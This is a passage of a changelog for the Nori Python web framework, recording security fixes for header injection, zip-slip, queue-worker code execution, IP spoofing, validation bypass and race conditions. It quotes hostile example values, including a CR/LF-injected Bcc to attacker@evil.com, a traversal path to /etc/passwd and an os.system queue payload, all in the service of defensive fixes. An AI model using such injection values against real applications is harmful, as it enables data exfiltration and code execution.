- **``flash_old`` crashed multipart forms with file inputs (HIGH).** ``core/http/old.py:flash_old`` put every form value into ``request.session``, including ``UploadFile`` objects. The default ``SessionMiddleware`` is cookie-backed and JSON-serialises the session on every response, and ``UploadFile`` is not JSON-serialisable — the response failed with ``TypeError: Object of type UploadFile is not JSON serializable`` the moment ``flash_old`` ran. The bug was silent in dev (you'd test the happy path) and exploded the first time a real user submitted a multipart form with a validation error. The fix duck-types upload-like values (``hasattr(value, 'filename')`` AND callable ``read``) and drops them before the session write. Browsers refuse to pre-populate ``<input type="file">`` for security reasons anyway, so the dropped file is the right semantic — every other field the user typed is preserved in the re-rendered form.
- **``unique`` rule hardcoded ``id`` as the except column (MED).** ``core/http/validation.py:_check_unique`` baked ``WHERE {column} = $1 AND id != $2`` into the SQL, so the "except this row" half of the rule only worked for models whose primary key was named ``id``. Tortoise lets a model declare its PK on any column (``code = fields.CharField(pk=True)``, ``uuid = fields.UUIDField(pk=True)``, etc.); an edit form for such a model crashed at validation with ``column "id" does not exist``. The rule now accepts an optional 4th parameter ``except_column`` (default ``'id'``, backwards-compatible). The new identifier is checked against the same ``_IDENTIFIER_RE`` used for ``table`` and ``column``, so the SQL injection guard extends to it.

  ```text
  unique:table,column                              # uniqueness only
  unique:table,column,except_value                 # except where id = except_value (existing)
  unique:table,column,except_value,except_column   # except where except_column = except_value (new)
  ```

- **``run_in_background`` silently overwrote existing tasks (MED).** ``core/tasks.py:run_in_background`` did ``response.background = background(...)`` unconditionally — any task already attached to the response (a controller's ``send_email``, for instance) was lost the moment a decorator or middleware called ``run_in_background`` to add a different task (an ``audit_log``). The user never got the email and there was nothing in the logs to tell you why. The function now promotes to Starlette's ``BackgroundTasks`` (plural) when a second task arrives: no existing task → set directly; existing ``BackgroundTasks`` → append in place; existing single ``BackgroundTask`` → wrap both into a fresh ``BackgroundTasks``. Tasks run in the order they were attached.

### Tests

912 → 921 passing. New regression tests, each verified to fail on pre-1.25 code:
- ``test_flash_old_drops_uploaded_files_before_session_write`` — ``UploadFile`` does not leak into the session
- ``test_flash_old_session_payload_is_json_serializable`` — end-to-end ``json.dumps`` round-trip on the stashed payload
- ``test_validate_async_unique_with_custom_except_column`` — the 4th param replaces the literal ``id`` in the SQL
- ``test_validate_async_unique_except_column_rejects_sql_injection`` — identifier check extends to the new param
- ``test_validate_async_unique_default_except_column_is_id`` — backwards-compat 3-param form still uses ``id``
- ``test_run_in_background_does_not_overwrite_existing_task`` — promotion to ``BackgroundTasks`` happens
- ``test_run_in_background_runs_both_existing_and_new_task`` — both callables actually execute, in order
- ``test_run_in_background_appends_to_existing_background_tasks`` — existing ``BackgroundTasks`` extended in place, not wrapped
- ``test_run_in_background_attaches_directly_when_no_existing_task`` — no regression on the single-task path

---

## [1.24.0] — 2026-04-30

### Fixed

- **Audit log loss during graceful shutdown (MED).** ``core/audit.py:audit`` scheduled the database write via ``loop.create_task`` and returned, with no tracking of the resulting task. A ``SIGTERM`` arriving in the millisecond gap between a controller returning and the task waking up would let the lifespan run ``Tortoise.close_connections()`` first; the audit write then fired against a closed pool, the ``except Exception`` in ``_write`` swallowed the failure, and the entry vanished. For high-frequency events this is annoying. For login, password change, role grant, delete, and payment events it's loss of forensic evidence. The fix tracks every in-flight audit task in a module-level set; the ASGI lifespan now calls a new ``flush_pending(timeout=5.0)`` from ``core.audit`` before tearing down DB connections, so the queue drains during graceful shutdown. A stuck write does not block shutdown forever — the timeout cancels still-pending writes and logs a warning, since a hung process is a worse outcome than a dropped audit entry.
- **Production startup warning when ``TRUSTED_PROXIES`` is empty (MED — observability).** ``get_client_ip`` fails secure: when ``TRUSTED_PROXIES`` is empty (the default) it ignores ``X-Forwarded-For`` from any source and returns ``request.client.host``. That posture prevents IP spoofing — but behind a load balancer ``request.client.host`` is the proxy's internal address, so every audit log entry records ``10.0.0.1`` (or similar) instead of the real client. The new ``_warn_missing_trusted_proxies`` helper, invoked from the lifespan, logs a one-time warning when ``DEBUG=False`` and ``TRUSTED_PROXIES`` is empty so operators discover the misconfiguration before they need the audit trail. No behavior change at request time.

### Tests

903 → 912 passing. New regression tests:
- ``test_audit_registers_pending_task_for_lifespan_flush`` — every ``audit()`` call must register its task so the flush can await it
- ``test_flush_pending_returns_immediately_when_empty`` — no-op fast path when no audit ran
- ``test_flush_pending_awaits_in_flight_audit_writes`` — the main shutdown sequence: pending writes drain before the function returns
- ``test_flush_pending_warns_and_continues_on_timeout`` — a stuck write yields a warning, not a hung shutdown
- ``test_trusted_proxies_warning_emits_in_production`` / ``…_silent_in_debug`` / ``…_silent_when_configured`` / ``…_silent_when_attribute_missing`` / ``…_silent_with_real_logger``

### Notes — investigated but not changed

- **Pagination cursor HMAC overhead** was flagged as "CPU fatigue on the read path." Profile shows ~3-5 μs per HMAC-SHA256 truncated to 16 bytes — 0.05 % of typical request latency. The signature exists for defense-in-depth: without it, any client can pass a hand-crafted cursor and induce arbitrary range scans against your indexed columns. Replacing HMAC with "something lighter" would be a foot-gun (HMAC IS the correct primitive for keyed MAC). Decision: keep as-is, retain the existing docstring rationale.

---

## [1.23.0] — 2026-04-30

### Upgrade notes — read first

Three independent MEDIUM-severity findings closed in one minor release. One is a breaking-shape change to the storage driver protocol; the other two are internal and require no caller updates.

**1. Storage drivers now receive a streaming ``source``, not ``bytes``.** Pre-1.23 the framework drained every upload into ``b''.join(chunks)`` before handing it to the driver — a 10 GB upload allocated ~20 GB of Python heap (the chunk list plus the joined bytes) before the size check could intervene. The driver protocol changed:

```python
# Before (1.22.x):
async def my_driver(filename: str, content: bytes, upload_dir: str) -> tuple[str, str]:
    ...

# After (1.23.0):
async def my_driver(filename: str, source, upload_dir: str) -> tuple[str, str]:
    # ``source`` is a file-like (a SpooledTemporaryFile in practice).
    # Stream from it via shutil.copyfileobj or an iterator — do NOT
    # call source.read() unbounded, the source may be a multi-GB
    # temp file already on disk.
    ...
```

Bundled drivers (``local``, ``s3``, ``gcs``) are already updated. Custom drivers registered via ``register_storage_driver()`` must update — the simplest mechanical migration is ``content = source.read()`` at the top of the handler, but for large uploads you should switch to a streaming copy.

### Fixed

- **Upload RAM exhaustion (MED).** ``core/http/upload.py:save_upload`` now spools the body into a ``tempfile.SpooledTemporaryFile`` capped at 8 MB in RAM (rolls to disk past that) instead of accumulating chunks into a Python list and concatenating them. RAM use is bounded to ~8 MB per in-flight upload regardless of file size — a 10 GB upload that previously OOM'd a worker now stays within process memory limits and rejects cleanly via the existing size cap. The driver protocol changed (see upgrade notes above) so the spool is passed through to the storage backend without a final ``bytes`` materialisation.
- **S3 / GCS drivers stream the body to httpx (MED).** ``services/storage_s3.py`` now stream-hashes the source for AWS V4 signing via a new ``_hash_and_size()`` helper and sends the body via a 64 KB chunked iterator with explicit ``Content-Length`` (so httpx does not fall back to ``Transfer-Encoding: chunked``, which S3 PutObject does not accept). ``services/storage_gcs.py`` measures the spool length, then streams via ``_iter_chunks()`` with explicit ``Content-Length``. Same RAM-bounding wins on the way out.
- **Queue worker RCE defence-in-depth (MED).** ``core/queue_worker.py:execute_payload`` now validates two more invariants on every payload before invoking the function:
  - The ``func`` field must be a bare ``module.path:function_name`` string with exactly one ``:`` and a function name matching ``^[A-Za-z_][A-Za-z0-9_]*$``. Dotted function names (``tasks:os.system``) are rejected up front rather than relying on ``getattr`` to fail.
  - After ``getattr`` resolves the callable, its ``__module__`` is re-checked against ``QUEUE_ALLOWED_MODULES``. This blocks the ``from os import system`` re-export vector — pre-1.23 an allow-listed ``tasks/__init__.py`` containing ``from os import system`` exposed ``tasks:system`` as a working RCE for anyone who could write to the queue store. Now the lookup proceeds, but the ``__module__`` check refuses the call because ``os`` is outside the allow-list.
  - The callable check (``if not callable(func)``) now raises a ``ValueError`` so a payload pointing at a constant or submodule fails loud instead of crashing later in the call site.
- **``framework:update`` atomic replace (MED).** ``core/cli.py:framework_update`` previously did ``rmtree(local_dir) → copytree(extract_dir, local_dir)`` for each of ``core``, ``commands``, ``models/framework``. If the second step failed mid-copy (disk full, permission glitch, archive corruption, ``Ctrl-C``), the project was left with the framework directory partially wiped — the next ``python3 nori.py`` would fail at import time with no easy recovery. The new flow is stage-and-swap: copy each new dir to ``<dir>.new`` first, and only after every staged copy succeeds do we ``os.replace`` them in atomically (with the previous version moved aside as ``<dir>.old`` and removed only at the end). A failure during staging raises with the live framework still intact; a failure during the replace phase is left to be cleaned up on the next run, but the live directory is never empty.

### Tests

896 → 903 passing. New regression tests:
- ``test_save_upload_passes_file_like_to_driver`` — guards the RAM regression: drivers must receive a streaming source, never raw bytes
- ``test_save_upload_streaming_handles_payload_above_ram_threshold`` — exercises the spool's roll-to-disk path with a lowered ``_SPOOL_RAM_LIMIT``
- ``test_hash_and_size_matches_sha256_of_full_body`` — streaming SHA-256 must produce the exact digest the V4 signer needs, across a chunk boundary
- ``test_execute_payload_rejects_dotted_func_name`` — bare-identifier check on the function name
- ``test_execute_payload_rejects_re_exported_os_system`` — ``__module__`` recheck blocks the ``from os import system`` re-export vector
- ``test_execute_payload_rejects_non_callable_attribute`` — non-callable lookups raise ``ValueError`` early
- ``test_framework_update_rolls_back_when_staging_fails`` — staging failure leaves the live framework dir untouched

Verified each test fails on the pre-1.23 code.

---

## [1.22.0] — 2026-04-30

### Upgrade notes — read first

Three independent HIGH-severity findings closed in one minor release. Two are breaking-shape changes (CSRF middleware contract for multipart, async signature on `Security.hash_password` / `Security.verify_password`); the third is internal.

**1. ``Security.hash_password`` and ``Security.verify_password`` are now async.** PBKDF2-HMAC with 100k iterations is CPU-bound (~50–200 ms per call). The previous synchronous methods blocked the asyncio event loop for that entire time — a burst of logins was enough to stall every other request in the worker. The methods now offload via ``asyncio.to_thread`` so the loop keeps serving traffic during the hash. **Breaking**: every caller must await the result.

```python
# Before (1.21.x):
hashed = Security.hash_password('secret')
ok = Security.verify_password('secret', hashed)

# After (1.22.0):
hashed = await Security.hash_password('secret')
ok = await Security.verify_password('secret', hashed)
```

**2. ``CsrfMiddleware`` no longer buffers ``multipart/form-data``.** The previous middleware buffered every state-changing request body up to 10 MB to extract the CSRF token from the form payload — defeating Starlette's streaming for file uploads and turning a single 10 MB upload into a 10 MB middleware allocation. The new contract:

- ``X-CSRF-Token`` header is checked first. If present, the body is **not** consumed.
- ``application/json`` and ``multipart/form-data`` requests **must** send the token via ``X-CSRF-Token``. Body parsing for these content types is removed.
- ``application/x-www-form-urlencoded`` still parses the token from the body, capped to ``CSRF_FORM_MAX_BODY_SIZE`` (default 1 MiB; configurable in settings).

If your app uploads files via multipart and relies on the form-field token, switch to sending the token via ``X-CSRF-Token`` header. ``Security.generate_csrf_token`` and ``csrf_field()`` are unchanged — only the middleware's body-parsing path is.

### Fixed

- **CSRF middleware DoS via body buffering (HIGH).** ``core/auth/csrf.py`` rewritten to validate the header first (no body read), refuse multipart without a header, and cap urlencoded bodies via configurable ``CSRF_FORM_MAX_BODY_SIZE`` (default 1 MiB). 100 concurrent slow 9 MB uploads no longer stack 900 MB of middleware allocation. The previous hardcoded 10 MB cap (``_MAX_BODY_SIZE``) is gone.
- **PBKDF2 blocking the event loop (HIGH).** ``core/auth/security.py:hash_password`` / ``verify_password`` now async, executing the hash on a worker thread via ``asyncio.to_thread``. New regression test ``test_hash_password_does_not_block_event_loop`` runs 8 concurrent hashes and asserts wall time stays under 4 s — would have run sequentially (~800 ms minimum) before the fix.
- **NaN / Inf bypass on ``min_value`` and ``max_value`` (HIGH).** ``core/http/validation.py`` now rejects ``NaN``, ``+Inf``, and ``-Inf`` in both rules. Pre-1.22.0, ``validate({'amount': 'nan'}, {'amount': 'min_value:5'})`` returned no errors — ``float('nan') < 5`` is ``False``, so the bound never tripped — letting hostile clients bypass amount / size / balance limits with the literal strings ``"nan"``, ``"inf"``, or ``"-inf"``. The ``numeric`` rule already guarded against this; the value rules now match.

### Tests

888 → 896 passing. New regression tests:
- ``test_min_value_rejects_nan`` / ``test_max_value_rejects_nan``
- ``test_min_value_rejects_inf`` / ``test_max_value_rejects_neg_inf``
- ``test_hash_password_does_not_block_event_loop``
- ``test_multipart_without_header_is_refused``
- ``test_multipart_with_header_passes_without_buffering``
- ``test_form_body_cap_is_configurable``

Verified each of the four bypass tests fails on the pre-1.22.0 code.

---

## [1.21.1] — 2026-04-30

### Fixed

- **Login lockout escalation no longer skips tiers under burst (HIGH).** `core/auth/login_guard.py:record_failed_login` checked `if attempts >= _MAX_ATTEMPTS`, so a single burst of `N > _MAX_ATTEMPTS` concurrent failed logins would let every request whose atomic `cache_incr` returned a value above the threshold re-fire the escalation block. The lockouts counter would jump by `N - _MAX_ATTEMPTS + 1` in milliseconds, walking past the 60s / 5m / 15m / 30m tiers and pinning the victim to the 1-hour ceiling from a single attack burst — turning the brute-force protection into a denial-of-service amplifier against legitimate accounts.

  The fix is a one-character change: `==` instead of `>=`. Only the request that crosses the exact threshold escalates; later requests in the burst that see `attempts > _MAX_ATTEMPTS` are no-ops and would have been rejected by the fast-path check at the top of the function had they arrived after `locked_until` was written.

  Regression test: `test_attempts_above_threshold_without_lockout_do_not_re_escalate` pre-seeds the post-burst state (stale above-threshold counter, no `locked_until` yet) and asserts the next failed login does NOT bump the lockouts counter. Verified: this test fails on the pre-1.21.1 code with the warning ``Account locked: victim@example.com (lockout #2, 300s)`` — the exact behavior the bug produces.

---

## [1.21.0] — 2026-04-30

### Upgrade notes — read first

This release closes Round 7 of the deep audit — a fresh sweep across auth, HTTP edge, stateful core, persistence, bootstrap/CLI, and service drivers. Four HIGH security findings, six MEDIUM hardening items, five LOW (docs + defaults). All findings were verified by reading the actual code; the agent reports flagged a number of false positives (Jinja XSS via `old()`, OAuth state replay, httpx auth header logging) which are not bugs and are NOT changed here.

**1. Email header injection is now refused.** `core.mail._build_message()` rejects CR/LF in `subject`, `from`, and any recipient. Pre-1.21.0, code that passed user input through to `subject` or `to` could allow an attacker to inject `\r\nBcc: attacker@evil.com` and exfiltrate mail. The new behavior raises `ValueError('Header injection attempt: ...')` instead of silently building a multi-header MIME message. Existing code that passes well-formed addresses and subjects is unaffected.

**2. Uploads are streamed in 64KB chunks.** `save_upload()` no longer calls `await file.read()` (which loads the entire body before checking the size). Instead it pulls 64KB at a time and aborts as soon as the running total crosses `max_size`. A 10GB upload now allocates ~64KB before refusal instead of ~10GB. When `UploadFile.size` is already populated and exceeds the limit, the read is skipped entirely.

**3. Zip extraction (installer + `framework:update`) refuses path traversal.** Both code paths now resolve every member's destination and assert it stays inside the extract directory. A compromised release archive containing `nori-vX.Y.Z/../../../etc/passwd` is rejected with a clear error before any byte is written.

**4. `@cache_response` accepts an optional `key_fn` for per-user / per-tenant scoping.** The default cache key shape is unchanged (URL path + query) — appropriate for anonymous endpoints. For authenticated routes, pass `key_fn=lambda r: f'u={r.session.get("user_id")}'` to inject the auth context into the cache key and prevent cross-user response bleed. Existing decorated endpoints keep their previous cache keys, so cached entries survive the upgrade.

### Fixed

- **Mail header injection (HIGH).** `core/mail.py:_reject_header_injection` rejects CR/LF in `subject`, `from`, and recipients before assignment to MIME headers. Python's `email.message.Message.__setitem__` does not sanitize newlines, so unsanitized user input was a direct injection path.
- **Upload OOM via `await file.read()` (HIGH).** `core/http/upload.py` reads the body in 64KB chunks via the new `_read_capped()` helper, aborting as soon as `max_size` is exceeded. Also short-circuits on `UploadFile.size` when the declared size already exceeds the limit.
- **Zip-slip in `framework:update` (HIGH).** `core/cli.py:_safe_extract_path` resolves every relative path against the extract directory and refuses any member that escapes via `..`. A regression test (`test_framework_update_refuses_zip_slip_member`) packs a malicious member and asserts `framework:update` raises rather than writing to disk.
- **Zip-slip in the installer (HIGH).** `docs/install.py:_safe_extract` replaces the old `zf.extractall(extract_dir)` call with a member-by-member walk that validates every destination path. The old code relied on Python ≥3.12's opt-in `filter='data'` argument which was never set.
- **Request-ID log injection (MEDIUM).** `core/http/request_id.py` now validates incoming `X-Request-ID` against `^[A-Za-z0-9_\-]{1,64}$` before adopting it. CR/LF or oversized values are silently dropped and a fresh UUID4 is generated, so a forged header can't introduce fake log lines downstream.
- **`regex:` validation rule capped at 4KB input (MEDIUM).** `core/http/validation.py:_REGEX_MAX_INPUT` bounds the worst-case ReDoS exposure. The pattern itself is developer-controlled (declared in the rules dict, never user-supplied), but a vulnerable pattern paired with a multi-megabyte input was the classic trigger; oversized inputs now fail the rule fast.
- **`@cache_response` key namespacing (MEDIUM).** New optional `key_fn` parameter lets developers scope cached responses by user / tenant / role. The default behavior is unchanged for backward compatibility — see the upgrade notes for when to use `key_fn`.
- **`nullable` no longer hides whitespace from other rules (MEDIUM).** Pre-1.21.0, `validate({'email': '   '}, {'email': 'nullable|email'})` returned no errors because `nullable` matched on whitespace-only strings. Now `nullable` triggers only when the field is missing, `None`, or an empty string — matching its docstring intent.
- **WebSocket message size cap (MEDIUM).** Both `WebSocketHandler` and `JsonWebSocketHandler` enforce `max_message_size` (default 1 MiB) on every received frame; oversized frames close the connection with code 1009 ("message too big" per RFC 6455). Subclasses can override by setting the class attribute. `JsonWebSocketHandler` now caps the raw text frame *before* `json.loads` runs, so a malicious payload can't allocate a giant parsed structure first.
- **Pagination cursors are now signed (MEDIUM).** `_encode_cursor` appends a 16-byte HMAC-SHA256 tag (truncated to 128 bits, signed with `SECRET_KEY`); `_decode_cursor` uses `hmac.compare_digest` to verify. A client can no longer forge a cursor pointing at an arbitrary timestamp / id to skip rows or trigger expensive range scans. Tokens issued before 1.21.0 will fail signature verification — surface a 400 and re-paginate from page 1 if you were caching cursors client-side.
- **`queue:work --name` argument escaping (LOW).** `core/cli.py:queue_work` uses `json.dumps(name)` when interpolating the queue name into the inline subprocess script. This is a CLI-only command (no remote attack surface), but the previous `f"queue_name='{name}'"` would let a hostile invocation inject arbitrary Python — closing it on principle.
- **Stable default ordering on `Role` and `Permission` (LOW).** Added `ordering = ['id']` to both `Meta` classes so `paginate_cursor()` over those tables yields contiguous, non-overlapping windows. Without the explicit ordering, Tortoise inherits the DB's natural row order which is unstable across pages.
- **Jinja autoescape pinned explicitly (LOW).** `core/jinja.py` sets `env.autoescape = select_autoescape(...)` rather than relying on Starlette's default. If Starlette ever changes its default in a future release, we don't silently lose XSS protection on `.html` / `.xml` templates.

### Documentation

- `core/ws.py` — class docstring now warns explicitly that the base `on_connect()` accepts ALL clients without authentication, and documents the override pattern (validate session, then `await websocket.accept()`).
- `models/framework/audit_log.py` — module docstring documents retention via `nori.py audit:purge --days N`.

### Tests

- 18 new tests covering the fixes above: CR/LF in mail, upload chunked-read abort + declared-size fast-path, zip-slip refusal in installer + framework_update, request_id CR/LF rejection, regex input cap, `cache_response` per-user isolation, nullable whitespace semantics, WebSocket oversize close, cursor tampering / forgery / wrong-secret rejection, queue_work hostile name escaping. Suite goes from 868 → 886 passing.

---

## [1.20.3] — 2026-04-30

### Tests

- **`lupa` is now a dev dependency.** The Redis-backed atomicity tests for `cache_incr`, `cache_atomic_update`, and `throttle.check_and_add` exercise the Lua scripts (`_INCR_LUA`, `_CHECK_AND_ADD_LUA`) that closed the v1.18.0 TOCTOU races. fakeredis can run those scripts only when `lupa` (Python bindings to libLua) is installed, so before this release the six tests were guarded by `pytest.skip('Redis incr tests require lupa for fakeredis Lua support')` and the actual Lua execution path went uncovered. Adding `lupa>=2.0` to `requirements-dev.txt` lifts the gate and turns those skips into real tests (suite goes from 856 pass + 6 skip to 862 pass + 0 skip). `lupa` ships pre-built wheels for macOS/Linux, so no compiler or system Lua install is required.

---

## [1.20.2] — 2026-04-30

### Added

- **Zero-config permissions fallback via the `User.roles` convention.** v1.20.1 introduced `ROLE_RESOLVER` for projects that need to override the default lookup, but many Nori projects already follow the convention of a `User` model with an M2M `roles` relation to `framework.Role`. `load_permissions()` now tries that convention as a second-tier fallback after `ROLE_RESOLVER`, so following the convention requires no boilerplate. Resolution order:
  1. Session has `role_ids` → use them.
  2. `ROLE_RESOLVER` configured → call it (explicit override).
  3. `get_model('User').get(id=user_id).prefetch_related('roles')` succeeds with non-empty `.roles` → use those role IDs.
  4. Else → warning + empty perms (existing fallback).

  Wrapped in a broad `except` because steps 3+ depend on project shape: projects with a single-role `User`, a relation under a different name, or no `User` model at all (token-only auth) all fall through to the warning instead of crashing.

### Documentation

- `docs/authentication.md` — new "Customizing the superuser role" subsection with the rationale for renaming `SUPERUSER_ROLE` (security hardening) and the disable-bypass example (`SUPERUSER_ROLE = ''`).
- `docs/caching.md` — new "Binary responses" subsection covering `@cache_response` byte-for-byte safety for PDFs/images/ZIPs and the legacy-shape read fallback that preserves cached entries across an upgrade.

---

## [1.20.1] — 2026-04-30

### Fixed

- **`load_permissions()` falls back to `ROLE_RESOLVER` when `role_ids` is missing.** v1.20.0 added a fail-safe that triggered `load_permissions()` from `require_permission()` when the session lacked a TTL marker, but the loader itself still gave up and returned `[]` if `role_ids` wasn't in the session. That left the user locked out for the full TTL window. The loader now invokes a project-supplied `ROLE_RESOLVER` callable (configured in `settings.py`) to derive `role_ids` from the user's actual roles in the database. Resolver exceptions are logged at ERROR but do not crash the request — falls back to empty permissions for the TTL window. Without a configured resolver, behavior matches v1.20.0 (warn + empty perms).

```python
# settings.py
async def _resolve_user_roles(user_id: int) -> list[int]:
    user = await User.get(id=user_id).prefetch_related('roles')
    return [r.id for r in user.roles]

ROLE_RESOLVER = _resolve_user_roles
```

### Documentation

- `docs/authentication.md` — new "Recovering when role_ids is missing" subsection covering `ROLE_RESOLVER` and when to use it.

---

## [1.20.0] — 2026-04-30

### Upgrade notes — read first

This release closes Round 6 of the deep audit ("Superuser & Scale"). Two security fixes for the auth layer plus a new pagination helper for deep-scrolling feeds.

**1. The superuser role name is now configurable via `SUPERUSER_ROLE`.** Pre-v1.20.0, the string `'admin'` was hardcoded in `require_role()`, `require_any_role()`, and `require_permission()` as a global bypass. Two problems with that: projects couldn't rename the privileged role to `'owner'` or `'root'`; and any bug in session handling, OIDC claim mapping, or third-party integration that lets an attacker set `role='admin'` grants total access. Default stays `'admin'` for backward compatibility — projects that want to harden the bypass against attacker-controlled values should pick a less guessable name in `settings.py`:

```python
SUPERUSER_ROLE = 'platform_owner'   # rename
SUPERUSER_ROLE = ''                  # disable the bypass entirely
```

When `SUPERUSER_ROLE` is empty, no role bypasses checks — every request is evaluated against its declared role/permission requirement.

**2. `require_permission()` now triggers a fail-safe `load_permissions()` call when the session has no permissions and no TTL marker.** Pre-v1.20.0, if a project's login flow forgot to call `load_permissions()`, the user landed on the dashboard with `permissions=[]` and was locked out of every gated route until manual re-login — the auto-refresh logic only fired when the TTL marker existed. The decorator now distinguishes three cases:
- TTL marker absent AND `permissions` empty → trigger load (the lockout case).
- TTL marker absent AND `permissions` populated → respect the manual write (OAuth callbacks, tests).
- TTL marker present and expired → normal periodic refresh.

`load_permissions()` also now sets the TTL marker in its empty-`role_ids` early return, so a project with the wrong shape doesn't trigger the load on every single request.

**3. New helper: `paginate_cursor()` for keyset pagination.** Additive, no breaking change. `paginate()` (offset-based) is fine for admin tables with a few thousand rows but degrades quickly on deep pages — the database walks and discards every row before the requested OFFSET. `paginate_cursor()` uses `WHERE field < cursor` against an indexed unique field, so cost is O(per_page) regardless of depth.

```python
from core.pagination import paginate_cursor

result = await paginate_cursor(Article.all(), per_page=20)
# {'data': NoriCollection([...]), 'per_page': 20, 'next_cursor': '...', 'has_next': True}

next_page = await paginate_cursor(Article.all(), cursor=result['next_cursor'], per_page=20)
```

Returns no `total` count and no `last_page` — those would defeat the index. Forward-only scrolling. Use `paginate()` when you need jump-to-page UX, `paginate_cursor()` for feeds and infinite scroll.

### Security

- **Hardcoded superuser bypass removed.** `require_role()`, `require_any_role()`, and `require_permission()` now call `_superuser_role()` which reads `SUPERUSER_ROLE` from config. See upgrade note 1.
- **Permissions lockout closed.** A project that forgot to wire up `load_permissions()` no longer leaves users locked out of every permission-gated route. See upgrade note 2.

### Added

- **`paginate_cursor()`** — keyset pagination with O(per_page) cost regardless of page depth. Cursor tokens are URL-safe base64 of a typed JSON pair, so datetimes and dates round-trip cleanly. Malformed cursors raise `ValueError` (callers can return 400).

### Documentation

- `docs/collections.md` — Pagination section gains a "Cursor (Keyset) Pagination" subsection with the trade-offs vs. `paginate()`.

### Changed

- `_superuser_role()` helper added to `core/auth/decorators.py`. Three call sites in the file replaced their hardcoded `'admin'` with this helper.
- `load_permissions()` sets the TTL marker even when `role_ids` is empty (previously only on the success path).

---

## [1.19.0] — 2026-04-30

### Upgrade notes — read first

This release closes Round 5 of the deep audit. Three findings, three breaking-by-design behavior changes. Read this section before upgrading any project that runs behind a proxy chain, caches binary responses, or serializes Tortoise models without `NoriModelMixin`.

**1. `X-Forwarded-For` is now parsed right-to-left.** Pre-v1.19.0, `get_client_ip()` took `forwarded.split(',')[0]` — the leftmost entry. An attacker can inject any value as the leftmost (`X-Forwarded-For: 1.2.3.4`) and the proxy chain appends to the right without rewriting the spoofed prefix. Result: bypassable IP-based rate limits and corrupted audit trails. The new walk is right-to-left, skipping `TRUSTED_PROXIES` until the first untrusted hop — that's the real client. Single-proxy chains (the most common deployment) keep working unchanged. If you have custom code that calls `get_client_ip()` and expected the leftmost value verbatim, the new return is the correct attacker-resistant identity.

**2. `@cache_response` stores bodies as base64-encoded bytes.** The decorator previously did `body.decode('utf-8')` before storing, which crashed on binary responses (PDFs, images, ZIPs) or — depending on the cache backend — silently corrupted them on read. Cache values now use a `body_b64` field. Old-shape entries (with `body` as a UTF-8 string) still render via a backward-compat read path, so cached entries survive the upgrade until they expire on TTL. No code change required.

**3. `NoriCollection.to_list()` raises `TypeError` for Tortoise models without `NoriModelMixin`.** The previous silent fallback walked `_meta.fields_map` and emitted every field, including `password_hash`, tokens, and any other secret the developer assumed `protected_fields` was hiding. The fail-safe now refuses loudly with a message that points at the mixin. If you have models that intentionally skip the mixin and rely on this serialization path, either:

```python
# Option A — recommended: inherit the mixin
from core import NoriModelMixin

class Article(NoriModelMixin, Model):
    protected_fields = ['internal_notes']

# Option B — explicit: serialize manually before to_list()
dicts = [{'id': a.id, 'title': a.title} for a in articles]
collect(dicts).to_list()
```

### Security

- **IP spoofing in audit log + throttle blocked.** `get_client_ip()` walks the `X-Forwarded-For` chain right-to-left, skipping `TRUSTED_PROXIES`, and returns the first untrusted hop. See upgrade note 1. Regression tests cover the spoofed-leftmost attack (returns the real source, not the injected value), multi-proxy CDN→ALB→app chains, the all-trusted fallback, and whitespace handling.
- **Sensitive data leakage in `Collection.to_list()` closed.** A Tortoise model without `NoriModelMixin` no longer serializes silently via `_meta.fields_map`. See upgrade note 3.

### Fixed

- **Binary response caching corrupted bodies.** `@cache_response` now stores response bodies as base64 so PDFs, images, ZIPs, and any non-UTF-8 content round-trip byte-for-byte. The Redis backend serializes cache values via JSON, which cannot represent raw bytes — the previous `body.decode('utf-8')` was a guaranteed crash or silent corruption depending on the backend. Backward-compat read accepts the legacy `body` field so cached entries survive an upgrade until TTL expiry. See upgrade note 2.

### Documentation

- `docs/security.md` — Trusted Proxies section now explicitly documents the right-to-left parse rule and why leftmost is unsafe.

### Changed

- `get_client_ip()` parsing semantics: leftmost → right-to-left walk.
- `@cache_response` cache value shape: `body` (str) → `body_b64` (base64 str). Reads accept both.
- `NoriCollection.to_list()` raises `TypeError` for `_meta.fields_map`-bearing items without `to_dict()`.

---

## [1.18.0] — 2026-04-30

### Upgrade notes — read first

This release closes Round 4 of the deep audit and ships a systemic response to a class of bug that kept resurfacing: **cache-backed counters with TOCTOU races**. Three independent components (queue retry counter, login lockout counter, rate-limit window) had the same shape — `cache_get` → modify → `cache_set` — and all three could be bypassed by concurrent traffic. We've added atomic primitives to the cache backend, codified the convention in `AGENTS.md`, and fixed every site that hit the anti-pattern.

**1. `core.cache.CacheBackend` gains `incr()` and `atomic_update()`.** Custom backends MUST implement both. `MemoryBackend` serializes via the existing asyncio lock; `RedisBackend` uses `INCR` + a Lua script for `incr` and `WATCH/MULTI/EXEC` for `atomic_update`. Convenience helpers: `cache_incr(key, ttl)` and `cache_atomic_update(key, fn, ttl)`. If you've subclassed `CacheBackend` in your project, add the two methods (or copy from `MemoryBackend` / `RedisBackend`) before upgrading.

```python
from core.cache import cache_incr

attempts = await cache_incr('login:user@example.com:attempts', ttl=3600)
if attempts >= 5:
    # locked out
    ...
```

**2. Throttle backend gains `check_and_add()` and uses it from the decorator.** The `@throttle('10/minute')` decorator no longer calls `get_timestamps` + `add_timestamp` separately — those two operations were the TOCTOU window. `check_and_add` is atomic in both the memory backend (asyncio lock) and the Redis backend (single Lua `EVAL`). If you implemented a custom `ThrottleBackend`, add `check_and_add(key, now, window, max_requests) -> tuple[bool, int, float | None]` before upgrading. The legacy `get_timestamps` / `add_timestamp` methods remain for direct test use.

**3. `revoke_token()` no longer raises on missing `jti`; it returns a `bool`.** Pre-v1.18.0, `revoke_token()` raised `ValueError` if the payload had no `jti`. `jti` is optional in RFC 7519, so logout endpoints that accepted third-party or legacy tokens crashed. The function now logs a warning and returns `False` for the no-jti case, `True` on a successful blacklist. First-party tokens issued via `create_token()` always carry a `jti`, so the success path is unchanged. If you were relying on the raise to detect malformed tokens, branch on the return value instead.

```python
ok = await revoke_token(payload)
if not ok:
    _log.info('Token had no jti, relying on natural expiry.')
```

### Security

- **Login brute-force bypass closed.** `record_failed_login()` previously did `cache_get` → increment → `cache_set` on a single dict. Under contention, 100 concurrent attempts all read `attempts=0`, all wrote `attempts=1`, and the lockout threshold never fired. Storage shape is now three scalar keys per identifier, and the counter goes through `cache_incr`, which is atomic in both backends. Regression test `test_brute_force_concurrent_attempts_trigger_lockout` fires 100 concurrent failed logins and asserts the account locks. (Round 4, finding 2.1.)
